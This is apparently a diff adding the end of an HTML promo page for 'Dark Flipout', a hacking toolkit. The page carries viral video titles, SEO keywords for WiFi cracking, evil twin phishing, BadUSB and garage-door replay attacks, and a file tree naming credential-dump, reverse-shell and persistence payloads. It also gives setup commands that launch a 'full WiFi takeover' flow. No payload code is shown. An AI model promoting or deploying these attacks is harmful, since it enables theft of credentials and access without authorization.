+            </div>
+        </div>
+
+        <!-- VIRAL TITLES + SEO -->
+        <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.85rem;letter-spacing:2px;margin:20px 0 15px;color:var(--accent);">VIRAL TITLE VAULT — TOP 20 SELECTED</div>
+        <div class="grid-2">
+            <div class="terminal">
+<span class="output">// FEAR / SHOCK CATEGORY //</span>
+<span class="success">"I Hacked Every WiFi Network on My Street"</span>
+<span class="success">"This Device Steals Passwords in 10 Seconds"</span>
+<span class="success">"I Opened a Garage Door I've Never Seen Before"</span>
+<span class="success">"Your Smart Lock Has No Idea I Can Bypass It"</span>
+<span class="success">"This $200 USB Stick Owns Any Windows PC"</span>
+<br>
+<span class="output">// CURIOSITY CATEGORY //</span>
+<span class="warn">"What Happens When You Plug This into a PC?"</span>
+<span class="warn">"The Device That Makes WiFi Hackers Nervous"</span>
+<span class="warn">"I Found Your WiFi Password in 47 Seconds"</span>
+<span class="warn">"What Your Phone Broadcasts Without Telling You"</span>
+<span class="warn">"The Radio Frequency No One is Protecting"</span>
+            </div>
+            <div class="terminal">
+<span class="output">// EDUCATIONAL CATEGORY //</span>
+<span class="cmd">"How WiFi Hacking Actually Works in 2025"</span>
+<span class="cmd">"Why Rolling Codes Don't Always Stop Hackers"</span>
+<span class="cmd">"WPA2 is Cracked — Here's the Proof"</span>
+<span class="cmd">"The $10 Chip That Can Replay Any Signal"</span>
+<br>
+<span class="output">// DRAMA / CHALLENGE //</span>
+<span class="success">"$200 Device vs $50,000 Security System"</span>
+<span class="success">"Pentest a Real Office in Under 60 Minutes"</span>
+<span class="success">"24 Hours With the Most Dangerous Gadget I Own"</span>
+<span class="warn">"Security Pros Challenged Me — Here's What Happened"</span>
+<span class="warn">"I Wardove My Entire City — Here's the Data"</span>
+<span class="warn">"Carried This for 30 Days — What I Captured"</span>
+            </div>
+        </div>
+
+        <!-- SEO + HOOKS -->
+        <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.85rem;letter-spacing:2px;margin:20px 0 15px;color:var(--accent);">FIRST-15-SECONDS HOOK LINES + SEO CLUSTERS</div>
+        <div class="grid-2">
+            <div class="terminal">
+<span class="output">// VIRAL HOOK OPENINGS //</span>
+<span class="success">"By the time you finish this sentence, I already</span>
+<span class="success"> have your WiFi password."</span>
+<span class="warn">"This is $200. This is your entire network.</span>
+<span class="warn"> These are not the same thing for long."</span>
+<span class="cmd">"I'm going to open that garage door.</span>
+<span class="cmd"> I have never been to this house before."</span>
+<span class="output">"Plug this in. Walk away. Come back in</span>
+<span class="output"> 10 seconds. I own your PC."</span>
+<span class="success">"Your phone just told me your name, your</span>
+<span class="success"> device type, and every WiFi you've ever used."</span>
+<span class="warn">"I spent 1 hour driving. I came back with</span>
+<span class="warn"> 2,847 networks and 71 cracked passwords."</span>
+            </div>
+            <div class="terminal">
+<span class="output">// PRIMARY SEO KEYWORDS //</span>
+<span class="success">marauder esp32 wifi hacking tutorial 2025</span>
+<span class="success">pmkid attack wpa2 crack hashcat rtx 4060</span>
+<span class="success">evil twin attack captive portal wifi phishing</span>
+<span class="success">badusb duckyscript attack windows 10 seconds</span>
+<span class="success">433mhz rolljam attack garage door cc1101</span>
+<span class="warn">wardrive gps wifi bluetooth mapping folium</span>
+<span class="warn">ble spam ios android popup attack 2025</span>
+<span class="warn">flipper zero esp32 marauder 4 antenna</span>
+<span class="cmd">penetration testing $200 device tutorial</span>
+<span class="cmd">wifi hacking for beginners 2025</span>
+<span class="cmd">karma attack rogue ap deauth flood</span>
+<span class="cmd">sub-ghz 300mhz replay attack signal capture</span>
+            </div>
+        </div>
+
+        <!-- CONTENT CALENDAR -->
+        <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.85rem;letter-spacing:2px;margin:20px 0 15px;color:var(--accent);">CONTENT CALENDAR — OPTIMAL RELEASE SCHEDULE</div>
+        <div class="terminal">
+<span class="output">WEEK 01 → EP01 "Unbox &amp; Build"       → Tuesday 3PM EST  → Hook: hardware reveal</span>
+<span class="output">WEEK 02 → SHORT "60-sec WiFi hack"    → Thursday 3PM EST → Drive EP02 views</span>
+<span class="output">WEEK 03 → EP02 "WiFi Hacking PMKID"  → Tuesday 3PM EST  → Highest SEO potential</span>
+<span class="output">WEEK 04 → SHORT "BadUSB in 10 sec"   → Thursday 3PM EST → Drive EP05 early</span>
+<span class="output">WEEK 05 → EP03 "Wardrive City"        → Tuesday 3PM EST  → Geographic SEO boost</span>
+<span class="output">WEEK 06 → SHORT "RollJam explained"  → Thursday 3PM EST → Tease EP06</span>
+<span class="output">WEEK 07 → EP04 "Evil Portal Live"     → Tuesday 3PM EST  → Highest viral potential</span>
+<span class="output">WEEK 08 → SHORT "BLE popup storm"    → Thursday 3PM EST → iOS user magnet</span>
+<span class="output">WEEK 09 → EP05 "BadUSB 10 Seconds"   → Tuesday 3PM EST  → All-time views target</span>
+<span class="output">WEEK 10 → SHORT "GPS wardrive clip"  → Thursday 3PM EST → Wardrive community</span>
+<span class="output">WEEK 11 → EP06 "433MHz Garage"       → Tuesday 3PM EST  → Security researcher pull</span>
+<span class="output">WEEK 12 → SHORT "Full pentest teaser"→ Thursday 3PM EST → Series finale hype</span>
+<span class="output">WEEK 13 → EP07 "Full Pentest $200"   → Tuesday 3PM EST  → FINALE — max push</span>
+<span class="success">// TARGET: 500K subs end of series. 10M+ total views. //</span>
+        </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════════════════════
+         SECTION 14 — MARKET READY PACKAGE
+         ═══════════════════════════════════════════════════════════ -->
+    <section class="section" id="package">
+        <div class="section-header">
+            <div class="section-number">14</div>
+            <div class="section-title">Market Ready Package — Everything Included</div>
+            <div class="section-line"></div>
+        </div>
+
+        <div class="terminal" style="margin-bottom:30px; border-color: var(--red);">
+<span class="success">╔══════════════════════════════════════════════════════════════════════╗</span>
+<span class="success">║        DARK FLIPOUT v1.0 — COMPLETE DELIVERABLE PACKAGE             ║</span>
+<span class="success">║        dark_flipout_package.zip — Deploy. Run. Dominate.            ║</span>
+<span class="success">╚══════════════════════════════════════════════════════════════════════╝</span>
+        </div>
+
+        <div class="grid-2">
+            <!-- File Tree -->
+            <div>
+                <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.85rem;letter-spacing:2px;margin-bottom:12px;color:var(--red);">PACKAGE CONTENTS</div>
+                <div class="sd-tree">
+<span class="sd-root">📁 dark_flipout/</span>
+├── <span class="sd-dir">📂 companion/</span>
+│   ├── <span class="sd-file">DF_Companion.py</span>          (main GUI)
+│   └── <span class="sd-dir">📂 modules/</span>
+│       ├── <span class="sd-file">DF01_serial_bridge.py</span>
+│       ├── <span class="sd-file">DF02_sd_sync.py</span>
+│       ├── <span class="sd-file">DF03_badusb_dep.py</span>
+│       ├── <span class="sd-file">DF04_pcap_analyzer.py</span>
+│       ├── <span class="sd-file">DF05_hash_cracker.py</span>
+│       ├── <span class="sd-file">DF06_portal_mgr.py</span>
+│       ├── <span class="sd-file">DF07_nfc_mgr.py</span>
+│       ├── <span class="sd-file">DF08_wardrive_map.py</span>
+│       ├── <span class="sd-file">DF09_ble_db.py</span>
+│       ├── <span class="sd-file">DF10_ai_planner.py</span>
+│       ├── <span class="sd-file">DF11_report_gen.py</span>
+│       ├── <span class="sd-file">DF12_db_updater.py</span>
+│       ├── <span class="sd-file">DF13_marauder_commander.py</span>
+│       ├── <span class="sd-file">DF14_wifi_assault.py</span>
+│       ├── <span class="sd-file">DF15_gps_tracker.py</span>
+│       ├── <span class="sd-file">DF16_subghz_commander.py</span>
+│       ├── <span class="sd-file">DF17_touchscreen_ui.py</span>
+│       └── <span class="sd-file">DF18_sd_ops.py</span>
+├── <span class="sd-dir">📂 flows/</span>
+│   ├── <span class="sd-file">FLOW_01_full_wifi_takeover.py</span>
+│   ├── <span class="sd-file">FLOW_02_wardrive_blitz.py</span>
+│   ├── <span class="sd-file">FLOW_03_evil_twin_chain.py</span>
+│   ├── <span class="sd-file">FLOW_04_subghz_replay.py</span>
+│   ├── <span class="sd-file">FLOW_05_badusb_blitz.py</span>
+│   └── <span class="sd-file">FLOW_06_ble_recon.py</span>
+├── <span class="sd-dir">📂 portals/</span>
+│   ├── <span class="sd-file">df_router_portal.html</span>
+│   ├── <span class="sd-file">df_corp_portal.html</span>
+│   ├── <span class="sd-file">df_hotel_portal.html</span>
+│   ├── <span class="sd-file">df_cafe_portal.html</span>
+│   └── <span class="sd-file">df_isp_portal.html</span>
+├── <span class="sd-dir">📂 payloads/</span>
+│   ├── <span class="sd-file">DF_WifiDump_Win.txt</span>
+│   ├── <span class="sd-file">DF_ChromeDump.txt</span>
+│   ├── <span class="sd-file">DF_RevShell_PS.txt</span>
+│   ├── <span class="sd-file">DF_SAM_Dump.txt</span>
+│   ├── <span class="sd-file">DF_PersistenceWin.txt</span>
+│   └── <span class="sd-file">+ 7 more payloads</span>
+├── <span class="sd-dir">📂 youtube/</span>
+│   ├── <span class="sd-file">DF_YouTube_Script_EP01-07.md</span>
+│   └── <span class="sd-file">DF_YouTube_Titles_Hooks.md</span>
+├── <span class="sd-file">DARK_FLIPOUT_SETUP_GUIDE.md</span>
+├── <span class="sd-file">DARK_FLIPOUT_CHEATSHEET.md</span>
+├── <span class="sd-file">DARK_FLIPOUT_MASTER.md</span>
+├── <span class="sd-file">index.html</span>                 (this page)
+└── <span class="sd-file">README.md</span>
+                </div>
+            </div>
+
+            <!-- Stats + Setup -->
+            <div>
+                <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.85rem;letter-spacing:2px;margin-bottom:12px;color:var(--red);">PACKAGE STATISTICS</div>
+                <div class="terminal" style="margin-bottom:20px;">
+<span class="output">Total Python modules   : 18 companion + 6 flows</span>
+<span class="output">Total lines of code    : ~15,000+</span>
+<span class="output">BadUSB payloads        : 12 DuckyScript files</span>
+<span class="output">Evil portal templates  : 5 HTML phish pages</span>
+<span class="output">YouTube scripts        : 7 full production docs</span>
+<span class="output">Viral titles           : 50 across 5 categories</span>
+<span class="output">Setup guide            : 13 sections, complete</span>
+<span class="output">Cheatsheet             : Print-ready laminate card</span>
+<span class="output">Attack flows           : 6 end-to-end kill chains</span>
+<span class="output">Sub-GHz targets        : 7 device profiles</span>
+<span class="output">BLE spam payloads      : 8 device types</span>
+<span class="warn">Hardware BOM total     : ~$234 USD</span>
+<span class="success">// ZERO DEPENDENCIES NOT IN requirements.txt //</span>
+                </div>
+
+                <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.85rem;letter-spacing:2px;margin-bottom:12px;color:var(--red);">5-MINUTE DEPLOY SEQUENCE</div>
+                <div class="terminal" style="margin-bottom:20px;">
+<span class="output"># 1. Unzip package</span>
+<span class="prompt">$</span> <span class="cmd">unzip dark_flipout_package.zip</span>
+<span class="prompt">$</span> <span class="cmd">cd dark_flipout</span>
+<br>
+<span class="output"># 2. Install Python deps</span>
+<span class="prompt">$</span> <span class="cmd">pip install -r requirements.txt</span>
+<br>
+<span class="output"># 3. Flash Marauder firmware</span>
+<span class="prompt">$</span> <span class="cmd">python3 -m esptool --chip esp32 \</span>
+<span class="prompt"> </span> <span class="cmd">write_flash 0x0 marauder.bin</span>
+<br>
+<span class="output"># 4. Launch companion</span>
+<span class="prompt">$</span> <span class="cmd">python3 companion/DF_Companion.py</span>
+<br>
+<span class="output"># 5. Run first attack flow</span>
+<span class="prompt">$</span> <span class="cmd">python3 flows/FLOW_01_full_wifi_takeover.py \</span>
+<span class="prompt"> </span> <span class="cmd">--port /dev/ttyUSB0 --profile aggressive</span>
+<span class="success">// FULLY OPERATIONAL IN &lt; 5 MINUTES //</span>
+                </div>
+
+                <div class="card-title" style="font-family:'Orbitron',sans-serif;font-size:0.85rem;letter-spacing:2px;margin-bottom:12px;color:var(--red);">HARDWARE BOM — ~$234 TOTAL</div>
+                <div class="terminal">
+<span class="output">ESP32 Marauder 4-antenna  : $45-75 USD</span>
+<span class="output">CC1101 433MHz module      : $8 USD</span>
+<span class="output">2" TFT touch display      : $12 USD</span>
+<span class="output">u-blox GPS module         : $15 USD</span>
+<span class="output">32GB+ microSD card        : $10 USD</span>
+<span class="output">LiPo battery 2000mAh      : $12 USD</span>
+<span class="output">USB-C power bank 10Ah     : $25 USD</span>
+<span class="output">Antenna set (4x SMA)      : $15 USD</span>
+<span class="output">3D printed case           : $8 USD</span>
+<span class="output">Misc cables + headers     : $10 USD</span>
+<span class="warn">ROG Strix G17 (RTX 4060)  : owns WPA2</span>
+<span class="success">TOTAL HARDWARE            : ~$234 USD</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- LEGAL -->
+        <div class="terminal" style="margin-top:30px; border-color: var(--warn);">
+<span class="warn">⚠️  LEGAL NOTICE — READ BEFORE USE</span>
+<span class="output">This toolkit is designed exclusively for authorized penetration testing, security research,</span>
+<span class="output">and educational purposes. All attack demonstrations must be performed on networks, devices,</span>
+<span class="output">and systems you own or have explicit written permission to test.</span>
+<span class="output"></span>
+<span class="output">Unauthorized use of these tools against networks or devices you do not own is illegal under</span>
+<span class="output">the Computer Fraud and Abuse Act (CFAA), UK Computer Misuse Act, EU NIS2 Directive, and</span>
+<span class="output">equivalent laws in virtually every jurisdiction worldwide.</span>
+<span class="output"></span>
+<span class="warn">Always obtain written authorization. Respect the law. Use this for defense, not offense.</span>
+        </div>
+    </section>
+
+</div>
+
+<!-- FOOTER -->
+<div class="footer">
+    <div class="footer-title">// DARK FLIPOUT — OPERATIONAL //</div>
+    <div class="footer-text">
+        Built for authorized security testing, education, and research only.<br>
+        Always obtain explicit written permission before testing any device, system, or network.<br><br>
+        Firmware: <a href="https://github.com/Next-Flip/Momentum-Firmware">Momentum</a> | 
+        AI: <a href="https://github.com/elder-plinius/V3SP3R">V3SP3R</a> | 
+        WiFi: <a href="https://github.com/justcallmekoko/ESP32Marauder">Marauder</a> | 
+        Hardware: <a href="https://github.com/eried/flipperzero-mayhem">Mayhem v2</a> | 
+        Resources: <a href="https://github.com/UberGuidoZ/Flipper">UberGuidoZ</a><br><br>
+        🖤 DARK FLIPOUT v1.0 — April 2026 🖤
+    </div>
+</div>
+
+<script>
+    // Animate capability bars on scroll
+    const bars = document.querySelectorAll('.bar-fill');
+    const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+            if (entry.isIntersecting) {
+                entry.target.style.animationPlayState = 'running';
+            }
+        });
+    });
+    bars.forEach(bar => {
+        bar.style.animationPlayState = 'paused';
+        observer.observe(bar);
+    });
+
+    // Glitch effect on hover for title
+    const title = document.querySelector('.logo-title');
+    title.addEventListener('mouseenter', () => {
+        title.style.animation = 'glitch 0.3s infinite';
+    });
+    title.addEventListener('mouseleave', () => {
+        title.style.animation = 'glitch 8s infinite, flicker 12s infinite';
+    });
+
+    // Random terminal blink effect
+    const termLines = document.querySelectorAll('.terminal .output');
+    setInterval(() => {
+        const randomLine = termLines[Math.floor(Math.random() * termLines.length)];
+        if (randomLine) {
+            randomLine.style.opacity = '0.3';
+            setTimeout(() => randomLine.style.opacity = '1', 100);
+        }
+    }, 3000);
+
+    // Nav active state
+    const sections = document.querySelectorAll('.section[id]');
+    const navLinks = document.querySelectorAll('.nav a');
+    window.addEventListener('scroll', () => {
+        let current = '';
+        sections.forEach(section => {
+            const sectionTop = section.offsetTop - 100;
+            if (window.scrollY >= sectionTop) current = section.getAttribute('id');
+        });
+        navLinks.forEach(link => {
+            link.style.color = '';
+            link.style.borderColor = '';
+            if (link.getAttribute('href') === '#' + current) {
+                link.style.color = 'var(--red)';
+                link.style.borderColor = 'var(--red)';
+            }
+        });
+    });
+
+    // Console easter egg
+    console.log('%c🖤 DARK FLIPOUT v1.0', 'color: #ff0033; font-size: 24px; font-weight: bold; font-family: monospace;');
+    console.log('%cAuthorized pentesting use only.', 'color: #00ffcc; font-family: monospace;');
+    console.log('%cFirmware: Momentum | AI: V3SP3R | WiFi: Marauder | HW: Mayhem v2', 'color: #888; font-family: monospace;');
+</script>
+
+</body>
+</html>
